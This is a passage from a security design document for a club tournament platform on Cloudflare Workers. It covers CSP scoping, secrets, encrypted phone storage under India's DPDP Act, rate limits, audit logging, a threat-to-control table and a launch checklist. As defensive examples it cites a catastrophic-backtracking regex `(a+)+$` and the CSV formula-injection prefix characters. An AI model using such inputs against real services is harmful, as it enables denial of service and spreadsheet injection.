the launch state, and the state in which §13's "no third-party script from any origin" is literally
true. When it **is** set, and **only on the two HTML documents that can render the widget**
(`/shell/tournament/index.html` for `/t/<slug>/register/`, and the prerendered `/join/` page), the
Worker emits:

```
script-src  'self' 'sha256-…' https://challenges.cloudflare.com;
frame-src   https://challenges.cloudflare.com;
connect-src 'self' https://challenges.cloudflare.com;
```

and **drops `Cross-Origin-Embedder-Policy` on those two responses only** (it is not `require-corp`
anywhere, so nothing else depends on it; `credentialless` still applies to every other document).
`style-src`, `img-src`, `object-src`, `base-uri`, `form-action` and `frame-ancestors` are unchanged.
Every other page, and every API response, keeps the strict policy.

**Rejected: widening the policy globally when the key is set.** The tournament bracket page, the
leaderboard and the admin shell have no reason to be able to reach `challenges.cloudflare.com`, and
a policy that is weaker everywhere because one form needs it is how a strict CSP dies by a thousand
exceptions.

**Rejected: dropping Turnstile entirely** and relying on the join code + `pending` quarantine + rate
limits (§3 controls 4, 6, 7). Defensible — those four layers are genuinely the load-bearing ones,
and Turnstile is explicitly *"raises cost; does not prevent"* in §16 residual risk 4. But it is free,
it is one `fetch` to `siteverify`, and for an online free tournament with a WhatsApp-shared join
code it is the only layer that costs a scripted attacker anything. Keep it, correctly scoped.

**§13's absolute claim is corrected accordingly**: no third-party script is loaded **in the default
configuration**, and the one that can be is a Cloudflare-owned anti-abuse widget on two forms,
switched by an operator-set secret, with a policy that is widened only on those two documents.

---

## 9. Secrets

- **Every secret is a Cloudflare Worker secret** (`npx wrangler secret put NAME`), listed in
  AUTH.md §11. Secrets are encrypted at rest by Cloudflare, are not readable back from the dashboard
  or the API, and are not present in the deployed bundle's source.
- **Nothing secret is in the repository.** Not in `wrangler.jsonc`, not in a committed `.dev.vars`,
  not in a `NEXT_PUBLIC_*` variable, not in a comment, not in a test fixture. `.gitignore` contains,
  verbatim: `.dev.vars`, `.dev.vars.*`, `.env`, `.env.*`, `.wrangler/`, `*.sqlite`, `*.sqlite3`,
  `*.db`, `db/backups/`. **`.dev.vars.*` and `.env.*` are separate lines on purpose** — `wrangler`
  reads `.dev.vars.<environment>` as well as `.dev.vars`, so `.dev.vars.production` is committable
  without the glob, and `.env.local` is committable without `.env.*`. The §17 checklist verifies
  this with `git check-ignore -v`, not by eye.
- **The `NEXT_PUBLIC_` trap.** Anything with that prefix is compiled into the static bundle and is
  public forever, including in `git` history. The only values that may ever carry it are the Turnstile
  **site** key and the site origin. Any addition to that list needs a second pair of eyes.
- **`ADMIN_BOOTSTRAP_TOKEN` is deleted after use** (`wrangler secret delete`), and the bootstrap
  response says so in plain English. A permanent bootstrap token is a permanent back door.
- **The Worker holds no Cloudflare API token.** This is why `POST /api/v1/admin/cache/purge` bumps a
  version counter rather than calling Cloudflare's purge API: an API token in the Worker would turn any
  Worker-level compromise into control of the whole Cloudflare account. Purge is achieved by changing
  the validator, which is strictly less powerful and entirely sufficient.
- **CI, when it exists**, uses a scoped `CLOUDFLARE_API_TOKEN` with *Workers Scripts:Edit* and
  *D1:Edit* on this zone only — never a Global API Key.
- **Rotation** is documented per secret in AUTH.md §11 with its blast radius, because several of these
  (`RECOVERY_PEPPER`, `PII_KEY`) cannot be rotated without a migration, and discovering that during an
  incident is the wrong time.
- **Local development** uses `.dev.vars` with throwaway values, never a copy of production secrets. A
  developer laptop is not in the trust boundary.
- **D1 backups.** `wrangler d1 export` output contains encrypted phone blobs but also every handle,
  entrant and audit row. Backups are treated as production data: stored encrypted, never in the repo,
  never in a shared drive, deleted after 90 days.

---

## 10. PII, and India's DPDP Act 2023

The club processes personal data of Indian residents, so the Digital Personal Data Protection Act
applies. The controls below are also just good engineering; the legal framing makes them
non-negotiable.

### 10.1 Minimisation — the data not collected

| Not collected | Why |
| --- | --- |
| Passwords | Passkeys. Nothing to leak, nothing to reuse, nothing to phish. |
| Date of birth | An age *bracket* is enough for an under-18 category (§10.5). A full DOB is identity-theft-grade data with no additional use here. |
| Full legal name | `display_name` is whatever the player chooses. |
| Address | The club is one city. There is no shipping. |
| Email | Optional, and only used if the optional email path is enabled. |
| Payment card / UPI details | **Never.** Entry fees are collected in cash or by direct UPI between player and organizer. `payment_ref` is a free-text note like `"UPI 4417/882"` and is capped at 60 chars. Storing payment instruments would drag in PCI-DSS-shaped obligations for a ₹200 entry fee. |
| Government ID | No. |
| Precise location | No. |
| Behavioural analytics / ad identifiers | No analytics of any kind. This keeps `connect-src 'self'` honest and removes an entire category of consent obligation. |
| Raw IP addresses | §10.3. |

**Phone number is optional at the account level** and required only when a specific tournament sets
`requires_phone = 1` — which an organizer should only do for events where they genuinely need to reach
players (offline fixtures, room codes). The registration form states the purpose inline: *"Shared with
the organizer of this tournament so they can contact you about fixtures. Not shown publicly."* That
inline notice is the DPDP §5 "notice at the time of collection" requirement, discharged at the exact
point of collection rather than buried in a policy page.

### 10.2 Phone numbers: encrypted, indexed blind, never bulk-exposed

D1 has no transparent disk encryption available to us, so the control is application-level.

- **Stored as `users.phone_enc` / `entrants.guest_phone_enc` / `entrant_members.phone_enc`:
  AES-256-GCM** via WebCrypto, key from the `PII_KEY` Worker secret, with a random 12-byte IV per
  record stored alongside the ciphertext, and **the owning row's id used as additional authenticated
  data** (so a ciphertext cannot be moved between rows).
- **`phone_last4`** is stored in the clear — it is what the organizer's UI shows by default and what
  makes "is this the right Kiran?" answerable without decrypting anything.
- **`phone_hash = HMAC-SHA256(PHONE_INDEX_KEY, e164)`** is a blind index for deduplication and lookup.
  A blind index over a 10-digit Indian mobile space is brute-forceable *if the key leaks*; the key is a
  separate Worker secret from `PII_KEY` precisely so that a D1 dump alone yields neither the numbers
  nor a usable index.
- **The full number is returned by exactly one endpoint**,
  `GET /api/v1/organizer/entrants/:id/contact` (plus its admin twin), which:
  - requires `ORG_OF(tournament)` (admin twin requires `ADMIN ∧ UV ∧ STEPUP`),
  - **writes an `audit_log` row on every single call** (`action: "entrant.contact.view"`),
  - is rate-limited to 60/hour per organizer.

  So "who looked up whose number, and when" is always answerable. A rival club's mole with organizer
  scope can still exfiltrate one number at a time — but they leave a per-record trail, which is both
  the deterrent and the forensic record.
- **No list endpoint ever contains a full phone number.** `GET /organizer/.../entrants` returns
  `phone_last4` only. This is the control that turns a leak of the entrant list from a breach into an
  annoyance.

#### 10.2.1 Custom `tel` fields — the same rule, and it is not automatic

The two bullets above named exactly two columns. But `content/games.json`'s `field_presets` ship
**four** `type: "tel"`, `pii: true`, `visibility: "organizer"` fields — `captain_whatsapp`,
`alt_whatsapp`, `player_whatsapp`, `guardian_whatsapp` — and they are on the default registration
form of **every team game in the catalogue**. Left alone, those values land in
`entrants.fields_json` / `entrant_members.fields_json` as **plaintext JSON**, and
`GET /organizer/tournaments/:id/entrants` — paginated at 100, un-audited, `rl_auth_read` only —
hands out up to 100 plaintext WhatsApp numbers per call. The entire audited-single-lookup design
above is bypassed by the default form of the club's most common event type. An implementer reading
only the two bullets has no instruction telling them these values are any different.

So, normatively, for **every** `FieldDef` with `type: "tel"` and `pii: true`:

**On write** (`POST .../register`, `POST .../guest-register`, `POST /organizer/.../entrants`,
every `PATCH` that touches `fields`, and `POST /invites/:code/accept`), the Worker:

1. normalises the value to E.164 (`+91…` unless `ALLOW_INTL_PHONE=1`);
2. encrypts it with `PII_KEY`, AAD = the **owning row's id**, and writes the ciphertext to the
   column below;
3. writes the last four digits to the matching `phone_last4` column;
4. **writes only the mask — `"+91 ••••• •4417"` — back into `fields_json`.** The plaintext never
   enters the JSON blob, so it cannot be leaked by any serializer that forgets a rule.

| `FieldDef` scope | Ciphertext column | Last-4 column |
| --- | --- | --- |
| `registration_fields` (entrant-scoped) | **`entrants.guest_phone_enc`** | `entrants.guest_phone_last4` |
| `member_fields` (member-scoped) | **`entrant_members.phone_enc`** | `entrant_members.phone_last4` |

Those are the real column names in `db/schema.sql`. CONTENT.md §3.3 previously promoted a member
`tel` field to `entrant_members.phone` and §3.4 to `players.phone`; **neither column exists** and
both references are corrected there.

When a form carries more than one `tel` field at the same scope, the **first** one in schema order
owns the encrypted column and the rest are stored masked-only — the club's contact-of-record is one
number, and `/entrants/:id/contact` returns that one. A second WhatsApp number is a convenience the
organiser sees masked, not a second contact channel; if the club ever needs both, that is an
`entrant_contacts` table, not a second nullable column.

**On read**, `GET /organizer/tournaments/:id/entrants` (API.md §4.6) and
`GET .../entrants.csv` (§4.19) return *custom fields of every visibility, with every `pii: true`
`tel` value masked to `phone_last4`* — which they do for free, because the mask is what is stored.
The plaintext remains reachable **only** through `GET /organizer/entrants/:id/contact` (§4.10),
which is `FULLORG_OF(t)`, writes an audit row on every call, and is capped at 60/hour.
`entrants.csv?include_contact=true` adds **one** dedicated `phone_e164` column — the primary number
— and never un-masks the schema columns; otherwise four plaintext numbers per squad would route
around the `include_contact` gate entirely.

The 180-day purge (§10.4) and the 18-month `pii` purge (CONTENT.md §3.3) must null **both** the
column and the blob key. AUTH.md §10.5 and §10.6 do exactly that.
- **CSV export with `include_contact=true`** is the one bulk path. It is audited, rate-limited to
  30/day, and the file carries a trailing line naming the exporting organizer, the timestamp, and
  *"contains personal data, do not forward"*. Watermarking does not prevent exfiltration; it makes a
  forwarded file traceable, which changes behaviour.
- **`/api/v1/me` returns the user's own number masked** (`+91 ••••• •4417`). The client has no
  legitimate need for the plaintext, and not sending it means it cannot be scraped by XSS or leaked in
  a client-side error report.

### 10.3 IP addresses

Raw client IPs are **never written to D1 and never returned by any endpoint**. Where an IP is needed —
rate limiting, abuse forensics, "where am I signed in" — it is stored as

```
ip_hash = base64url( HMAC-SHA256(IP_HASH_KEY, cf_connecting_ip) )[0:16]
```

`sessions.ip_city` holds a coarse city string from `request.cf.city` for the session-management UI.
`sessions.ua_summary` holds a derived string like `"Chrome on Android"` — never the raw `User-Agent`,
which is a fingerprinting surface with no operational value here.

`IP_HASH_KEY` rotates yearly, which resets rate counters and breaks correlation with older hashes.
Both are acceptable and the rotation is the point.

### 10.4 Retention, erasure, and the rights endpoints

| Data | Retention |
| --- | --- |
| Contact details on an entrant (`guest_phone_enc`, `notes`) | Purged **180 days** after the tournament reaches `completed` or `cancelled`, by the nightly cron. |
| Guest tokens | Invalidated when the tournament completes. |
| `webauthn_challenges`, `email_otps` | Minutes; swept nightly. |
| Sessions | Deleted 30 days after `absolute_expires_at`. |
| `idempotency_keys` | 24 hours. |
| `audit_log` | **3 years.** Justified as necessary for the integrity of competition records; it holds actor ids and `ip_hash`, never raw IPs or phone numbers (`before_json`/`after_json` write `"[redacted]"` in place of any PII field). |
| Match results, brackets, standings | Indefinite. They are the club's record and other participants have a legitimate interest in them. |
| Account on deletion request | 30-day grace, then finalised (§below). |

**`GET /api/v1/me/export`** returns every row about the requesting user as JSON — the DPDP right to
access, self-service, no ticket, no delay. Rate-limited to 1/hour.

**`DELETE /api/v1/me`** (step-up + UV + typed handle confirmation) sets `deletion_requested_at`,
revokes every session immediately, and hides the profile. After **30 days** the nightly cron finalises:
PII columns nulled, `handle` rewritten to `deleted_<short id>`, `handle_reservations` updated, and
`entrants` / `entrant_members` rows **retained but anonymised**. `POST /api/v1/me/undelete` cancels
within the window.

Retaining anonymised entrant rows is deliberate and defensible: a published bracket is a shared record
of a competition, and erasing one participant would falsify the other participants' records. This is a
legitimate-purpose retention, it is stated plainly on the privacy page, and the retained row carries no
identifier beyond the anonymised display name that was already public on the bracket.

### 10.5 Minors

A gaming club in a tier-2 Indian city will have players under 18, and DPDP §9 imposes real obligations
around them, including verifiable parental consent and a prohibition on behavioural tracking and
targeted advertising.

Proportionate controls:

- **No behavioural tracking or advertising exists on this platform for anyone.** That removes the
  sharpest edge of §9 by construction, not by policy.
- Signup asks a single yes/no: *"Are you 18 or older?"* → `users.is_adult`. No date of birth, because
  a DOB is more sensitive than the question needs.
- `is_adult = 0` accounts: phone number is **never** exposed to organizers through
  `/entrants/:id/contact` or the CSV export, `requires_phone` is treated as satisfied without a number,
  and the profile is forced `profile_public = 0` unless an organizer records guardian consent.
- A tournament may set `minors_allowed = 0`, in which case registration by a `is_adult = 0` account is
  refused with a clear message.
- For under-18 entrants at offline events, the organizer records guardian consent **offline** and ticks
  `entrants.guardian_consent = 1` with a guardian name in `organizer_note`. That is the honest
  implementation for a club that takes paper forms at a desk; a digital verifiable-consent flow would
  require an identity provider the club does not have and would not be more truthful.
- A self-declaration is not verification, and this document does not pretend otherwise. It is
  proportionate for a platform that runs no ads, does no profiling, and stores no sensitive category
  data.

### 10.6 Grievance and breach

DPDP requires a named contact for grievances and notification of the Data Protection Board and affected
users on a breach.

- `/privacy/` names a **Grievance Officer** (a club office-bearer) with an email address, sourced from
  the admin-editable club info (`GET /api/v1/club`) so it can be corrected without a deploy.
- A breach runbook lives in `docs/DEPLOY.md` (another agent's file) and must cover: rotate
  `SESSION_PEPPER` (logs everyone out), bump every `session_epoch`, rotate the affected peppers,
  export the `audit_log` for the window, notify affected users, notify the Board.

---

## 11. Input validation, ReDoS, and resource limits

- **Body size:** 64 KiB for JSON endpoints, 256 KiB for the two bulk endpoints (API.md §0.3). Checked
  against `Content-Length` **before** reading the body, and again while reading (a chunked request can
  lie).
- **Depth and breadth:** the JSON parser output is walked with a depth cap of 10 and an array-length
  cap of 1000 before any field is touched. A deeply nested JSON body is a cheap CPU attack.
- **Every string is length-capped** at the schema's `max_len` before any regex is run against it.
- **ReDoS.** Organizers and admins supply regexes through `registration_schema[].pattern` (API.md
  §3.3). An unvalidated pattern like `(a+)+$` against a 64-char input burns the whole CPU budget on
  every registration. Controls:
  - the pattern must be **anchored** (`^…$`) and ≤ 200 characters;
  - **nested quantifiers, backreferences and lookbehind are rejected** by a structural check at write
    time (`/admin/games`, `PATCH /organizer/tournaments/:id`) — the practical rule is: reject any
    pattern where a quantifier `*`, `+`, `{n,}` applies to a group that itself contains an unbounded
    quantifier, and reject `\1`–`\9` and `(?<`;
  - the input is truncated to `max_len` (≤ 256) before matching, bounding the worst case;
  - patterns are validated once at write time, not per registration.
- **No user-controlled regex anywhere else.** The `q` search parameter is a `LIKE` with escaped
  metacharacters (§6), never a regex.
- **All D1 reads are bounded** — every `SELECT` that can return more than one row has a `LIMIT`
  (API.md Appendix D). There is no unbounded `SELECT *` on `entrants`, `matches`, `audit_log`, or
  `leaderboard_entries`.
- **Long operations are resumable, not long.** Bracket generation, reseeding, publishing and
  leaderboard rebuild chunk at 200 statements per batch and can be re-run safely; the "done" flag is
  written in the final chunk so a partial failure is retryable rather than half-committed.
- **Pagination limits are clamped, not rejected** — `limit=99999` becomes 100. A rejection here would
  break a client for no security gain.
- **Timestamps are range-checked** (`starts_at` within ±10 years) so a `Number.MAX_SAFE_INTEGER`
  cannot poison a sort or an index.
- **Integers are range-checked**: scores `0..999`, kills `0..200`, seeds `1..1024`, money
  `0..100_000_000` paise (₹10 lakh — above that, something is wrong).

---

## 12. Rate limiting, availability, and cost

### 12.1 The primitives, and their honest limits

| Primitive | Used for | Limitation to design around |
| --- | --- | --- |
| **Workers Rate Limiting binding** | All hot-path buckets (API.md §7) | Fixed windows of **10 s or 60 s only**; enforced per-colo and approximately, not globally. Fine for stopping scripts; not a billing meter. |
| **D1 counter table** (`rate_counters`) | Long-window limits: per-day registrations, per-hour exports, per-day recovery attempts | Costs a write. Only used on low-frequency endpoints. |
| **Cloudflare Turnstile** | Guest registration, signup | Free; needs a secret; cleanly skipped when unset. |
| **Cloudflare WAF / zone rate limiting** | Blunt L7 protection | Limited on the free plan; treat as a bonus, never as the design. |
| **Edge caching** | The actual DoS defence for public reads | Only works because public responses do not vary by identity (API.md §1). |

The full bucket table is API.md §7. The three that matter:

- **Auth:** `rl_auth_verify` 10/60 s per IP hash; `rl_recovery` 5/60 s per IP hash **plus**
  10/24 h per user **plus** account lock after 10 consecutive failures (AUTH.md §4.3).
- **Registration:** `rl_register` 5/60 s per user; `rl_register_ip` 15/24 h per IP hash; `rl_guest`
  5/60 s per IP hash.
- **Score:** `rl_score` 30/10 s per user — deliberately generous. An organizer entering a fast
  badminton round is not an attacker, and a rate limit that fires during a live final is a worse
  outcome than the abuse it prevents (the abuse is already blocked by the predicate and recorded by
  the audit log).

A `429` never reveals which bucket tripped; the message is generic. `Retry-After` is always set.
A `429` on the public-read bucket is served **without touching D1**.

### 12.2 Brute force on recovery codes — the arithmetic

Per code: 10 characters from a 28-symbol alphabet ≈ **2^48** possibilities. A user has 10 live codes,
so a targeted attacker faces roughly `2^48 / 10 ≈ 2.8 × 10^13` expected guesses. Through
5 attempts/minute per IP, 10/day per account, and a one-hour lock after 10 consecutive failures, that
is not a threat on any timescale. Distributing across IPs does not help: the per-account daily cap and
the account lock are keyed on the account, not the IP.

Requiring the **handle** alongside the code (AUTH.md §4.3) removes the spray-across-all-accounts
strategy entirely. Non-existent handles perform the same dummy HMAC and return the same error, so
there is no enumeration oracle.

### 12.3 Availability during a live event

The visible failure mode for this product is the site dying during a final. The design against it is
in API.md §8.3–§8.5:

- **`caches.default` on every public GET** collapses any number of viewers into roughly **one D1
  read per 5 seconds** per tournament. Note what this does and does not do: with
  `run_worker_first` the Worker sits *in front of* Cloudflare's cache, so a Worker-constructed
  response is never stored in the zone cache and `s-maxage` alone collapses nothing at the edge —
  every poll is still a Worker invocation. What is saved is the D1 read and the JSON assembly, which
  is the part that can actually fall over. API.md §8.5 therefore makes `caches.default` mandatory,
  not optional, and ARCHITECTURE.md §2 pins the paid plan because the invocation count is real.
- The `If-None-Match` 304 path is **one indexed row read** — no entrant query, no match query, no JSON
  assembly — and it runs *before* the cache lookup, so a conditional hit costs ~200 bytes.
- Server-driven `Poll-After`, client-side jitter of ±15%, and 1.5× adaptive backoff on consecutive
  304s. The jitter is not cosmetic: 400 phones that opened the same WhatsApp link within the same
  second would otherwise poll in permanent lockstep.
- Polling stops when the tab is hidden.
- Organizer mutations are unaffected by read load because they are `no-store` and never queued behind
  cache fills.

### 12.4 Cost amplification

Workers bill per request and per CPU-millisecond, so "make the site expensive" is a real attack with a
low bar.

- The CSP report endpoint samples at 1% and never touches D1 — an unsampled DB-backed report sink is a
  free write amplifier.
- `/healthz` is one `SELECT 1`, no auth, no logging beyond a counter.
- 404s and 429s are cheap paths that never query D1.
- Public reads are served from `caches.default`. **"Requires a session" is not by itself a defence**
  — signup is free and open by design — so every authenticated GET is bucketed too:
  `rl_auth_read` 120/60 s per user over `/me/*`, `/organizer/*`, `/admin/*`, `/guest/*`, and a
  tighter `rl_engine` 20/60 s over the two endpoints that run the bracket engine
  (`/organizer/matches/:id/impact`, `/organizer/tournaments/:id/bracket/preview`). Without those,
  one account could hold the unpaginated organiser and admin reads open at full speed against D1 and
  the CPU budget, which is exactly this attack. See API.md §7.
- The dynamic OG renderer (`OG_DYNAMIC=1`) is the one genuinely CPU-heavy route
  (~100–300 ms). It is **off by default**, and when on it is keyed by `state_version` in the URL and
  served `immutable`, so each version renders at most once. An unknown slug 302s to a static PNG
  rather than rendering.
- Cloudflare's dashboard billing alert is configured at 3× the expected monthly spend. That is the
  backstop for anything not anticipated here.

---

## 13. Supply chain

The runtime dependency list is short on purpose, and every addition is a decision:

```
next  react  react-dom  clsx
@simplewebauthn/server  @simplewebauthn/browser
marked            (Worker-side only, at write time, tokenizer only)
ulid              (or ~20 lines of local code)
```

- **`marked` runs only in the Worker, only at write time, and only its tokenizer is used** — its HTML
  renderer is never invoked (API.md §9). A `marked` vulnerability in HTML output is therefore not
  reachable from this codebase.
- **`@simplewebauthn/*` is the one dependency where a compromise is a full auth bypass.** Pin exact
  versions (no `^`), review the diff on every bump, and treat a major version as a code change rather
  than a chore.
- **Exact-pin every runtime dependency**, commit `package-lock.json`, and use `npm ci` in CI.
- **In the default configuration, no third-party script, font, analytics, or embed is loaded at
  runtime from any origin.** That is what makes `default-src 'self'` and `connect-src 'self'`
  truthful, and the CSP is what enforces the promise. Adding a single external script requires
  weakening the policy, which is the intended friction.

  **The one exception, and it is opt-in:** when `TURNSTILE_SITE_KEY` is set, the Cloudflare
  Turnstile widget loads on the two registration forms, and the CSP is widened **on those two
  documents only** (§8.1.1). At launch the key is unset and the sentence above is literally true. No
  other third-party origin may ever be added without a corresponding entry here and in §8.1.
- `npm audit --omit=dev` in CI; a high or critical advisory fails the build.
- **Dev dependencies are not in the runtime trust boundary, but they are in the build trust boundary.**
  A compromised build-time package can inject code into `out/`. The CSP hash script (§8.1) does not
  detect this — it would happily hash malicious inline script. Mitigation is `npm ci` from a committed
  lockfile plus not adding build tooling casually.

---

## 14. Logging and audit

- **Every mutating endpoint writes an `audit_log` row inside the same `.batch()` as the mutation**
  (§2.3). No exceptions, including admin endpoints and including failures that changed state.
- Row shape: `id, at, actor_user_id, actor_role, actor_ip_hash, action, entity_type, entity_id,
  tournament_id, before_json, after_json, summary, request_id`.
- `action` is a dotted namespace so it can be prefix-filtered: `match.score`, `match.reopen`,
  `entrant.status`, `entrant.contact.view`, `tournament.publish`, `user.role`, `auth.recovery_used`,
  `auth.counter_regression`, `admin.bootstrap`, `admin.bootstrap_failed`.
- **`before_json` / `after_json` never contain PII.** Phone numbers, encrypted blobs and tokens are
  written as `"[redacted]"`. The audit log is retained for 3 years and read by organizers; it must not
  become a shadow copy of the personal data everything else works to minimise.
- Organizers can read their own tournament's trail (`GET /organizer/tournaments/:id/audit`, PII further
  redacted); admins read everything.
- **`console.log` never receives a session token, a recovery code, a guest token, a raw IP, a phone
  number, or a full request body.** Worker logs are visible to anyone with dashboard access. Log the
  `request_id`, the route, the status, the actor id, and the duration.
- **Log injection:** any user-supplied value that must appear in a log line is `JSON.stringify`'d, so a
  display name containing a newline cannot forge a log entry.
- Every response carries `X-Request-Id`, which is the same ULID as `error.request_id` and the audit
  row — a player can quote it to an organizer and it resolves to exactly one request.

---

## 15. Threat → control index

| Threat | Primary control | Backstop | Detection |
| --- | --- | --- | --- |
| Player edits a score | `ORG_OF(t)` predicate on the loaded object (§2.1) | Server recomputes the winner; slot membership check (§2.2) | `audit_log` + `match_audit`; public attribution |
| Organizer edits another club's tournament | `tournament_organizers` scope, separate from role (§2.1, AUTH.md §7.1) | 403/404 split (§4) | `audit_log` |
| **Removed co-organizer keeps acting** | `revoked_at IS NULL` inside `ORG_OF` / `FULLORG_OF` / `OWNER_OF` (AUTH.md §7.2); the DELETE is a soft revoke | Predicate is re-evaluated per request against the loaded row, so no session revocation is needed | `audit_log` on the revoke; 403/404 on their next call |
| **Volunteer scorer exfiltrates phone numbers** | `tournament_organizers.role` is read: contact lookup, contact CSV, payment fields, publish and reopen all require `FULLORG_OF(t)` (AUTH.md §7.2) | 60/h `rl_contact`; CSV audited and watermarked | `entrant.contact.view` audit rows; `role_insufficient` 403s |
| **Bulk PII via custom `tel` fields** | `tel` + `pii` values are encrypted on write and only the mask reaches `fields_json` (§10.2.1) | `include_contact` gate is `FULLORG_OF`; the mask is what the list serializer has | `entrants.export.contact` |
| **Any account reads every entrant** | `GET /entrants/:id` requires `MINE ∨ ROSTERED ∨ ORG_OF`, 404 otherwise (AUTH.md §7.3) | 80-bit ids are defence in depth only — the ids are published by §1.6 | `rl_auth_read` 120/60 s |
| **Indefinite ban does not stick** | `S` gates on `users.status = 'active'`, not on a nullable timestamp (AUTH.md §7.2) | `session_epoch` bump kills live sessions; login re-tests `status` | `audit_log` on `user.suspend` |
| **Superseded recovery codes stay live** | `superseded_at IS NULL` in the redemption `WHERE` (AUTH.md §4.3) | Regeneration is one `UPDATE`, in the same batch as the new inserts | `auth.recovery_used` naming the batch |
| **Join code from another tournament** | `tournament_id = t.id` in the lookup (AUTH.md §7.3.2) | Conditional consume with `used_count < max_uses`, `meta.changes === 1` | `audit_log` on guest registration |
| **Stale write commits half a batch** | Every statement in the batch repeats the version/capacity condition (API.md §6.2.1) | `meta.changes === 0` on the guard means zero rows written anywhere | `409 stale_version` rate |
| Organizer quietly rewrites history | Publish freezes scores; reopen needs a public reason (§2.3) | Unpublish is admin + step-up | Append-only `match_audit` |
| Player edits another player's registration | `MINE(e)` predicate (§4, AUTH.md §7.2) | Partial unique index; `entrant_locked` state rules | `audit_log` |
| IDOR on tournament / entrant ids | Predicate against the loaded object (§4 Rule 2) | 80-bit ULIDs; 404 for invisible objects | — |
| Mass assignment / privilege escalation via body | Explicit per-endpoint field allowlist (§4 Rule 3) | Unknown fields rejected | `audit_log` on `user.role` |
| Mass fake registrations | Passkey-gated accounts; join codes; Turnstile (§3) | `pending` quarantine; unique index; rate limits | Organizer's unconfirmed count |
| Brute force on recovery codes | 2^48 per code; handle required (§12.2) | Per-IP + per-account limits; 1 h lock | `auth.recovery_used`, lock events |
| Session fixation | Rotate id **and** secret on every auth (§5.4) | `__Host-` prefix; server-minted ids only | `audit_log` |
| Session theft via subdomain cookie | `__Host-` prefix (§5.4) | Host-only cookie, no `Domain` | — |
| CSRF | Origin allowlist + session-bound token + JSON content type (§5.2) | `SameSite=Lax`; no CORS headers | `csrf_failed` rate |
| Stored XSS via team name / handle | Strict charset; React escaping (§7.2) | No `dangerouslySetInnerHTML` anywhere; CSP without `unsafe-inline` | CSP reports |
| Stored XSS via markdown rules | Closed-allowlist AST, no HTML path (§7.1) | CSP `script-src` hashes only | CSP reports |
| Stored XSS via OG meta injection | HTML-attribute escaping before `setAttribute` (§7.3) | Charset rules forbid `<`/`>` in titles | CSP reports |
| Homograph / bidi impersonation | Bidi + zero-width rejection; ASCII handles (§7.2) | 90-day handle reservation | — |
| CSV formula injection | Prefix `= + - @ TAB CR` cells with `'` (§7.4) | Export audited and watermarked | `entrants.export.contact` |
| SQL injection | `prepare().bind()` everywhere, no concatenation (§6) | Length + charset validation before the query | — |
| Clickjacking | CSP `frame-ancestors 'none'` (§8) | `X-Frame-Options: DENY` | — |
| Open redirect | `?next=` origin validation (§7.5) | All other redirects server-computed | — |
| Phone number harvesting | One audited endpoint; lists carry `last4` only (§10.2) | AES-GCM at rest; blind index keyed separately | `entrant.contact.view` audit rows |
| Bulk PII exfiltration by an organizer | CSV export audited, rate-limited, watermarked (§10.2) | 60/h contact-view limit | `audit_log` |
| Live-event DoS | `s-maxage=5` edge collapse; 1-statement 304 path (§12.3) | Adaptive backoff; jitter; visibility gating | Cloudflare analytics |
| Cost amplification | Cheap 404/429 paths; sampled CSP reports; OG off by default (§12.4) | Billing alert at 3× | Billing alert |
| ReDoS via organizer regex | Structural pattern rejection at write time (§11) | Input truncated to `max_len` | CPU-limit errors |
| Secret leakage | Wrangler secrets; nothing in repo; no CF API token in the Worker (§9) | `NEXT_PUBLIC_` allowlist | Code review |
| Dependency compromise | Short pinned list; `marked` tokenizer-only; `npm ci` (§13) | CSP limits what injected code can reach | `npm audit` in CI |

---

## 16. Residual risks (accepted, documented, not mitigated)

Stating these plainly is part of the control. An undocumented accepted risk is an unnoticed one.

1. **An organizer can falsify their own tournament's results.** They are trusted with scores by
   definition. Mitigation is transparency, not prevention: append-only history, public "updated by"
   attribution, public correction reasons, a per-tournament audit trail visible to co-organizers, and
   optional dual confirmation on the final. This is a governance problem with a technical assist, and
   pretending otherwise would be dishonest.
2. **An admin can do anything, including editing published results after an unpublish.** Every action
   is audited to a 3-year log they cannot delete through any endpoint — but an admin with `wrangler`
   access to the D1 database can edit the log itself. The real control is that admin count is small
   and admin sessions are short (7-day idle, 30-day absolute) and step-up gated.
3. **A guest token in a URL can be shared or screenshotted.** Scoped to one entrant, expires at
   tournament completion, rotatable by the organizer, stripped from the URL on first paint. Accepted
   because the alternative — forcing a walk-in to create an account at the desk — is worse for the
   product.
4. **Turnstile and join codes are bypassable by a determined human.** They raise cost; they do not
   prevent. The quarantine design (§3) is what bounds the damage.
5. **A `uv = 0` session (device without biometrics, or email OTP) can register and withdraw entries.**
   It cannot touch scores, roles, recovery codes, or any ⚡ endpoint. Deliberate: excluding cheap
   Android handsets from the product is a worse outcome than this exposure.
6. **The blind phone index is brute-forceable if `PHONE_INDEX_KEY` leaks** — the Indian mobile number
   space is ~10^9. Hence a separate secret from `PII_KEY`, so a D1 dump alone yields neither.
7. **Recovery codes fall immediately if the attacker has both the D1 dump and `RECOVERY_PEPPER`.** A
   slow KDF would have bought hours in that scenario; it would also have blown the Workers CPU budget
   on every login and created a cost-amplification vector. At that level of compromise every other
   pepper is gone too. The tradeoff is stated in AUTH.md §4.2.
8. **`style-src 'unsafe-inline'` remains.** CSS injection is a real if weaker vector; it is unreachable
   here because no user input reaches a style (§7.1, §8.1).
9. **Rate limiting is per-colo and approximate.** A distributed attacker gets a multiple of the stated
   limit. The per-account and per-day D1 counters, which are global, cover the cases where that
   matters.
10. **Age is self-declared** (§10.5). Proportionate for a platform with no ads, no profiling, and no
    sensitive-category data.
11. **WhatsApp caches link previews for days and there is no purge API.** A tournament renamed or
    repriced after being shared keeps showing the old preview. Product mitigation: the UI tells the
    organizer to share the link *after* publishing, not before.

---

## 17. Pre-launch checklist

Every line is verifiable, and none of them ships as "probably fine".

**Auth**
- [ ] Passkey registration and sign-in work on Chrome/Android, Safari/iOS, and Chrome/desktop.
- [ ] `rp_id` is `nellore.club`; a passkey created on `www.` works on the apex.
- [ ] The localhost origin is **not** in the allowlist when `ENVIRONMENT=production`.
- [ ] A replayed WebAuthn challenge is rejected (`meta.changes !== 1` path proven with a test).
- [ ] A recovery code cannot be used twice (proven by two concurrent redemptions of one code).
- [ ] **A code from a superseded batch is rejected**: redeem one, regenerate, then try an old code
      from the printed sheet → `401 invalid_recovery_code` (AUTH.md §4.3 step 4 carries
      `superseded_at IS NULL`).
- [ ] **The recovery flow completes end to end on a device with no passkey and no biometrics**:
      redeem a code → the recovery session → `POST /me/credentials/options` → `/verify` → a `full`
      session. It must **not** return `403 uv_required` (AUTH.md §7.3.1). Test this on a device
      where `isUserVerifyingPlatformAuthenticatorAvailable()` is false; it is the exact user the
      flow exists for.
